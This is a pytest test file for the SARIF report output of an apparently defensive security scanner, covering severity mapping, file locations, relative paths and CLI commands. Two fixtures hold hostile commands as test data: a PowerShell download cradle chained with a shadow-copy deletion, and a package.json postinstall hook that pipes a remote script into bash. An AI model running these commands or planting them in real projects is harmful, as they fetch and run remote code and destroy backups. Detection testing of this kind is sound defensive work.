"""SARIF 2.1.0 output: structure, severity mapping, file vs logical locations, paths relative to a source root,
self-recognition by the file scanner, and the CLI entry points. Pure Python; no network."""

import json
from pathlib import Path

import pytest

from aegis.core.models import CheckResult, CheckStatus, Finding, Remediation, ScanResult, Severity
from aegis.core.report import (SARIF_SCHEMA, finding_file, is_aegis_report, render_sarif, write_report)


def _result(*findings, checks=()):
    r = ScanResult(profile="full", host={"hostname": "h"}, scanners=["files", "persistence"],
                   started="2026-10-16T09:00:00", finished="2026-10-16T09:05:00")
    for f in findings:
        r.add(f)
    r.checks.extend(checks)
    return r


def _sarif(r, base=None):
    return json.loads(render_sarif(r, base))


def test_document_shape_and_driver():
    doc = _sarif(_result(Finding("AEG-X", "Thing", Severity.HIGH, "malware", location="C:\\a\\b.exe")))
    assert doc["$schema"] == SARIF_SCHEMA and doc["version"] == "2.1.0" and len(doc["runs"]) == 1
    run = doc["runs"][0]
    drv = run["tool"]["driver"]
    assert drv["name"] == "Aegis Security Suite" and drv["version"] and drv["informationUri"].startswith("https://")
    assert run["automationDetails"]["id"] == "aegis/full/"
    assert run["invocations"][0]["executionSuccessful"] is True
    assert run["properties"]["grade"] and isinstance(run["properties"]["score"], int)
    assert run["properties"]["scanners"] == ["files", "persistence"]


def test_empty_scan_is_valid():
    run = _sarif(_result())["runs"][0]
    assert run["results"] == [] and run["tool"]["driver"]["rules"] == []


def test_levels_and_security_severity():
    r = _result(*(Finding(f"AEG-{s.name}", s.name, s, "suspicious", location=f"/x/{s.name}") for s in Severity))
    run = _sarif(r)["runs"][0]
    level = {x["ruleId"]: x["level"] for x in run["results"]}
    assert level == {"AEG-CRITICAL": "error", "AEG-HIGH": "error", "AEG-MEDIUM": "warning", "AEG-LOW": "note",
                     "AEG-INFO": "note"}
    rules = {x["id"]: x for x in run["tool"]["driver"]["rules"]}
    sec = {k: v["properties"].get("security-severity") for k, v in rules.items()}
    assert sec == {"AEG-CRITICAL": "9.5", "AEG-HIGH": "8.0", "AEG-MEDIUM": "5.5", "AEG-LOW": "3.0", "AEG-INFO": None}
    assert all(9.0 < float(sec["AEG-CRITICAL"]) <= 10 and 7.0 <= float(sec["AEG-HIGH"]) < 9.0 for _ in [0])


def test_rules_are_deduplicated_and_carry_the_worst_severity_and_tags():
    r = _result(Finding("AEG-R", "Low one", Severity.LOW, "persistence", location="/a", mitre=["T1547.001"]),
                Finding("AEG-R", "High one", Severity.HIGH, "persistence", location="/b", mitre=["T1053.005"]),
                Finding("AEG-S", "Other", Severity.MEDIUM, "browser", location="/c"))
    run = _sarif(r)["runs"][0]
    rules = run["tool"]["driver"]["rules"]
    assert [x["id"] for x in rules] == ["AEG-R", "AEG-S"]
    rule = rules[0]
    assert rule["defaultConfiguration"]["level"] == "error" and rule["properties"]["security-severity"] == "8.0"
    assert rule["properties"]["tags"][:2] == ["security", "persistence"]
    assert {"external/mitre-attack/T1547.001", "external/mitre-attack/T1053.005"} <= set(rule["properties"]["tags"])
    assert "attack.mitre.org/techniques/T1053/005/" in rule["help"]["markdown"]
    assert all(run["tool"]["driver"]["rules"][x["ruleIndex"]]["id"] == x["ruleId"] for x in run["results"])
    assert [x["level"] for x in run["results"] if x["ruleId"] == "AEG-R"] == ["error", "note"]  # per-result level


def test_result_message_fingerprint_and_properties():
    f = Finding("AEG-X", "Known malware", Severity.CRITICAL, "malware", "Hash matches a sample.", "/tmp/e.com",
                {"sha256": "ab" * 32}, "Quarantine it.", Remediation("quarantine_file", {"path": "/tmp/e.com"}),
                scanner="files", mitre=["T1204.002"])
    res = _sarif(_result(f))["runs"][0]["results"][0]
    assert res["message"]["text"] == "Known malware. Hash matches a sample."
    assert res["partialFingerprints"] == {"aegisFingerprint/v1": f.fingerprint}
    p = res["properties"]
    assert p["severity"] == "critical" and p["scanner"] == "files" and p["mitre"] == ["T1204.002"]
    assert p["evidence"]["sha256"] == "ab" * 32 and p["recommendation"] == "Quarantine it."


@pytest.mark.parametrize("loc, ev, expected", [
    ("C:\\Users\\bob\\evil.exe", {}, "C:\\Users\\bob\\evil.exe"),
    ("C:\\dl\\a.zip!inner/payload.exe", {}, "C:\\dl\\a.zip"),
    ("/home/bob/app/package.json#scripts.postinstall", {}, "/home/bob/app/package.json"),
    ("\\\\server\\share\\x.ps1", {}, "\\\\server\\share\\x.ps1"),
    ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", {}, None),
    ("pid 4242 (notepad.exe)", {}, None),
    ("https://evil.example/login", {}, None),
    ("chrome extension abcdefghijklmnop", {"path": "/home/bob/.config/google-chrome/Default/Extensions/abc"},
     "/home/bob/.config/google-chrome/Default/Extensions/abc"),
    ("Startup entry", {"file": "C:\\ProgramData\\x.vbs"}, "C:\\ProgramData\\x.vbs"),
    ("Startup entry", {"file": "relative/x.vbs"}, None),
    ("", {}, None),
])
def test_finding_file(loc, ev, expected):
    assert finding_file(Finding("A", "t", Severity.LOW, "c", location=loc, evidence=ev)) == expected


def test_file_locations_absolute_uris_regions_and_logical_locations():
    r = _result(
        Finding("AEG-SEC", "Secret", Severity.HIGH, "privacy", location="C:\\Users\\bob\\My Docs\\keys.txt",
                evidence={"keys": [{"kind": "aws", "line": 12}]}),
        Finding("AEG-ARC", "Archive member", Severity.HIGH, "malware", location="/srv/dl/a.zip!x/evil.exe",
                evidence={"line": 3}),
        Finding("AEG-REG", "Run key", Severity.MEDIUM, "persistence", location="HKCU\\Software\\Run\\Evil"),
        Finding("AEG-NOLOC", "Setting", Severity.LOW, "system"),
    )
    by = {x["ruleId"]: x for x in _sarif(r)["runs"][0]["results"]}
    sec = by["AEG-SEC"]["locations"][0]["physicalLocation"]
    assert sec["artifactLocation"] == {"uri": "file:///C:/Users/bob/My%20Docs/keys.txt"}
    assert sec["region"] == {"startLine": 12}
    arc = by["AEG-ARC"]["locations"][0]
    assert arc["physicalLocation"]["artifactLocation"]["uri"] == "file:///srv/dl/a.zip"
    assert arc["physicalLocation"]["region"]["startLine"] == 3
    assert arc["logicalLocations"][0]["fullyQualifiedName"] == "/srv/dl/a.zip!x/evil.exe"
    assert by["AEG-REG"]["locations"] == [{"logicalLocations": [{"fullyQualifiedName": "HKCU\\Software\\Run\\Evil",
                                                                  "kind": "resource"}]}]
    assert "locations" not in by["AEG-NOLOC"]


def test_bool_line_is_not_a_region():
    r = _result(Finding("AEG-B", "b", Severity.LOW, "c", location="/x/y", evidence={"line": True}))
    assert "region" not in _sarif(r)["runs"][0]["results"][0]["locations"][0]["physicalLocation"]


def test_paths_relative_to_a_posix_source_root():
    r = _result(Finding("AEG-SC", "Bad dep", Severity.CRITICAL, "malware", location="/work/repo/web app/package-lock.json"),
                Finding("AEG-OUT", "Elsewhere", Severity.HIGH, "malware", location="/work/other/x.js"),
                Finding("AEG-ROOT", "The root itself", Severity.LOW, "malware", location="/work/repo"))
    run = _sarif(r, "/work/repo")["runs"][0]
    by = {x["ruleId"]: x["locations"][0]["physicalLocation"]["artifactLocation"] for x in run["results"]}
    assert by["AEG-SC"] == {"uri": "web%20app/package-lock.json", "uriBaseId": "SRCROOT"}
    assert by["AEG-OUT"] == {"uri": "file:///work/other/x.js"}
    assert by["AEG-ROOT"] == {"uri": "file:///work/repo"}
    assert run["originalUriBaseIds"] == {"SRCROOT": {"uri": "file:///work/repo/"}}


def test_paths_relative_to_a_windows_source_root_case_insensitively():
    r = _result(Finding("AEG-SC", "Bad dep", Severity.HIGH, "malware", location="c:\\src\\Repo\\sub\\yarn.lock"))
    run = _sarif(r, "C:\\Src\\repo")["runs"][0]
    art = run["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]
    assert art == {"uri": "sub/yarn.lock", "uriBaseId": "SRCROOT"}
    assert run["originalUriBaseIds"]["SRCROOT"]["uri"] == "file:///C:/Src/repo/"


def test_no_base_ids_when_nothing_is_relative():
    r = _result(Finding("AEG-REG", "Run key", Severity.MEDIUM, "persistence", location="HKCU\\Run\\X"))
    assert "originalUriBaseIds" not in _sarif(r, "/work/repo")["runs"][0]


def test_errored_checks_become_tool_notifications_and_times_are_utc():
    r = _result(checks=[CheckResult("AEG-USB", "USB", CheckStatus.ERROR, "OSError: boom"),
                        CheckResult("AEG-FW", "Firewall", CheckStatus.PASS, "on")])
    inv = _sarif(r)["runs"][0]["invocations"][0]
    assert inv["toolExecutionNotifications"] == [{"level": "error", "message": {"text": "USB: OSError: boom"},
                                                  "descriptor": {"id": "AEG-USB"}}]
    assert inv["startTimeUtc"].endswith("Z") and inv["endTimeUtc"].endswith("Z")
    r.started, r.finished = "garbage", ""
    inv = _sarif(r)["runs"][0]["invocations"][0]
    assert "startTimeUtc" not in inv and "endTimeUtc" not in inv


def test_write_report_by_suffix_and_explicit_format(tmp_path):
    r = _result(Finding("AEG-X", "x", Severity.HIGH, "malware", location="/x"))
    p = write_report(r, tmp_path / "out.sarif")
    assert json.loads(p.read_text(encoding="utf-8"))["version"] == "2.1.0"
    assert b"\r\n" not in p.read_bytes()
    q = write_report(r, tmp_path / "out.json", fmt="sarif")
    assert json.loads(q.read_text(encoding="utf-8"))["runs"]
    with pytest.raises(ValueError, match="sarif"):
        write_report(r, tmp_path / "out.pdf")


def test_own_sarif_is_recognised_but_lookalikes_are_not(ctx, tmp_path):
    from aegis.scanners.files import scan_file

    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://x/a') ; vssadmin delete shadows /all /quiet"
    r = _result(Finding("AEG-HEUR", "Suspicious script", Severity.HIGH, "suspicious", location="c:/x.ps1",
                        evidence={"matched": cradle}))
    for name in ("report.sarif", "report.sarif.json"):
        p = write_report(r, tmp_path / name, fmt="sarif")
        assert is_aegis_report(p.read_bytes(), p.suffix.lstrip("."))
        assert scan_file(ctx, p) == [], name
    data = render_sarif(r)
    other = json.loads(data)
    other["runs"][0]["tool"]["driver"]["name"] = "SomethingElse"
    assert not is_aegis_report(json.dumps(other, indent=2).encode(), "sarif")
    two = json.loads(data)
    two["runs"].append(two["runs"][0])
    assert not is_aegis_report(json.dumps(two, indent=2).encode(), "sarif")
    assert not is_aegis_report(b'{"version": "2.1.0", "$schema": "' + SARIF_SCHEMA.encode() + b'", "runs": [', "sarif")
    assert not is_aegis_report(cradle.encode(), "sarif")


def test_cli_scan_report_sarif(tmp_path, eicar_bytes, capsys):
    from aegis.cli import main

    (tmp_path / "e.com").write_bytes(eicar_bytes)
    out = tmp_path / "scan.sarif"
    assert main(["scan", "custom", "--scanners", "files", "--path", str(tmp_path), "-q", "--report", str(out)]) == 1
    doc = json.loads(out.read_text(encoding="utf-8"))
    res = [x for x in doc["runs"][0]["results"] if "EICAR" in x["message"]["text"]]
    assert res and res[0]["level"] == "error"
    assert res[0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"].startswith("file:")
    assert main(["report", str(tmp_path / "again.sarif"), "--source-root", str(tmp_path)]) == 0
    again = json.loads((tmp_path / "again.sarif").read_text(encoding="utf-8"))
    uris = [x["locations"][0]["physicalLocation"]["artifactLocation"] for x in again["runs"][0]["results"]
            if "EICAR" in x["message"]["text"]]
    assert uris and uris[0] == {"uri": "e.com", "uriBaseId": "SRCROOT"}


def test_cli_check_project_sarif_is_relative_to_the_project(tmp_path):
    from aegis.cli import main

    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "package.json").write_text(json.dumps({"name": "demo", "version": "1.0.0", "scripts": {
        "postinstall": "curl -s http://198.51.100.7/x.sh | bash"}}), encoding="utf-8")
    out = tmp_path / "sc.sarif"
    main(["check-project", str(proj), "--offline", "-q", "--report", str(out)])
    doc = json.loads(out.read_text(encoding="utf-8"))
    arts = [x["locations"][0]["physicalLocation"]["artifactLocation"] for x in doc["runs"][0]["results"]
            if "locations" in x and "physicalLocation" in x["locations"][0]]
    assert arts and all(a.get("uriBaseId") == "SRCROOT" and a["uri"] == "package.json" for a in arts)
    assert doc["runs"][0]["originalUriBaseIds"]["SRCROOT"]["uri"] == Path(proj).resolve().as_uri() + "/"
